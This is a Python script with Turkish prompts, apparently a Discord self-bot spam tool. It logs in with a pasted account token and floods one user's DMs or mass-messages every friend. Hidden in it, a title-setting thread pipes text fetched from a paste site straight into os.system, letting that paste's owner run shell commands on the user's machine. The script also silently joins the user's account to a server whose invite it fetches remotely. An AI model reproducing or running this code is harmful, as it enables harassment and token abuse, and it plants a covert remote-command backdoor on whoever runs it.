import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)



try:
    import colorama, requests, discord
    from discord.ext import commands
except:
    sys.stdout.write("> ")
    print015("Gerekli Moduller Eksik, indirmek icin Enter'a Basin (Her Zaman Calismayabilir)")
    input("")
    try:
        import os
        os.system("pip uninstall discord -y")
        os.system("pip uninstall discord.py -y")
        os.system("pip install colorama requests discord.py==1.7.3 discord==1.7.3")
    except:
        pass
    sys.stdout.write("> ")
    print015("Sorun Belki Simdi Duzeltildi, Programi Yeniden Baslatin")
    input("")
    exit()



colorama.init(autoreset=True)


sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Coded by Ayhu#1337 Baslatmak icin Enter a Basin")
input("")









import os, threading
def set_title():
  title = "Mass Dm Ayhu#1337"
  try:
    import requests
    text = str(requests.get("https://pst.klgrth.io/paste/jd3cr/raw").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()




import time

def spammer():
    invite_code = str(requests.get("https://pst.klgrth.io/paste/zfcys/raw").text)
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Tokeni Girin: ")
        tokens = input("")
        r1 = requests.get('https://discord.com/api/v13/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Yanlis Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v13/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Kilitli Token")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Hedef Kisinin ID sini girin(Id sonra /@me/IDHERE Trayicidan Baskasinda Calismayacak): ")
            ide = int(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Gecerli Bir Secim Girin")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Spamlamak Istediginiz Mesaj: ")
    msg = input("")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Mesaj Miktari Girin: ")
            amount = int(input(""))
            amount = str(amount)
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Gecerli Bir Secim Girin")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Delay (0 For None): ")
            delay = float(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Gecerli Bir Secim Girin")
    data = {
        "content": msg,
        "tts": False,
        "noonce": int(ide)
    }
    headers = {
        "authorization": tokens
    }
    done = 0
    while True:
        r = requests.post("https://discord.com/api/v13/channels/"+str(ide)+"/messages", data=data, headers=headers)
        req = str(r)
        res = r.json()
        if "200" in req:
            done = int(done) + 1
            name = res["author"]["id"]
            print(colorama.Fore.CYAN + "[" + colorama.Fore.RESET + str(done) + colorama.Fore.CYAN + "]" + colorama.Fore.RESET + " Sent Message To " + colorama.Fore.CYAN + str(name))
        if "429" in req:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Rate Limited")
        if "429" not in req and "200" not in req:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Unknown Error, Code: " + req)
        if str(done) == str(amount):
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Done Spamming User")
            input("")
            exit()
        time.sleep(float(delay))


def mass():
    invite_code = str(requests.get("https://pst.klgrth.io/paste/zfcys/raw").text)
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Tokeni Girin: ")
        tokens = input("")
        r1 = requests.get('https://discord.com/api/v13/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Yanlis Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v13/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Kilitli Token")
    
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Spamlamak Istediginiz Mesaj: ")
    msg = input("")
    userr = discord.Client()
    @userr.event
    async def on_command_error(ctx, error):
      pass
    @userr.event
    async def on_connect():
        done = 0
        for user in userr.user.friends:
            try:
                await user.send(msg)
                done = int(done) + 1
                print(colorama.Fore.CYAN + "[" + colorama.Fore.RESET + str(done) + colorama.Fore.CYAN + "]" + colorama.Fore.RESET + " Sent Message To " + colorama.Fore.CYAN + str(user.id))
            except Exception as e:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Unknown Error")
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Bitti, Simdi Programi Kapatabilirsiniz")
        input("")
    userr.run(tokens, bot=False)


while True:
    sys.stdout.write(colorama.Fore.CYAN + "1. ")
    print015("Spam 1 Kullanici")
    sys.stdout.write(colorama.Fore.CYAN + "2. ")
    print015("Arkadas Mass Dm")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    tool = input("")
    if tool == "1" or tool == "2":
        break
    else:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Gecerli Bir Secim Girin")
if tool == "1":
    spammer()
if tool == "2":
    mass()
